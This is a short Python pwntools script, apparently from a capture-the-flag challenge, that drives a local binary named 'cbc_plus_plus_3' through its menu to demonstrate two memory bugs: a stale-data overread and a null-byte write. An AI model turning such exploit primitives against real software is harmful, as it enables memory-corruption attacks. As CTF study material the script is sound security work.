#!/usr/bin/env python3
from pwn import *
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
context.binary = elf = ELF(str(ROOT / "cbc_plus_plus_3"), checksec=False)


def start():
    return process(elf.path)


def new_z(p, n, data=b""):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Length: ", str(n).encode())
    p.sendafter(b"Data: ", data)
    p.recvuntil(b"Done\n")


def new_s(p, data):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Data: ", data)
    p.recvuntil(b"Done\n")


def move_z_to_s(p):
    p.sendlineafter(b"> ", b"3")


def show(p):
    p.sendlineafter(b"> ", b"5")
    return p.recvuntil(b"6. Exit\n> ", drop=False)


def demo_stale_overread():
    p = start()
    new_z(p, 16, b"B" * 16)
    new_z(p, 1, b"A")
    move_z_to_s(p)
    out = show(p)
    idx = out.find(b"std string: ")
    print(out[idx:idx + 80].hex())
    p.close()


def demo_null_write_top_byte():
    p = start()
    new_z(p, 25, b"\x00" + b"A" * 24)
    move_z_to_s(p)
    new_z(p, 1000, b"B" * 1000)
    out = show(p)
    print(out[:200])
    p.close()


if __name__ == "__main__":
    demo_stale_overread()
    demo_null_write_top_byte()
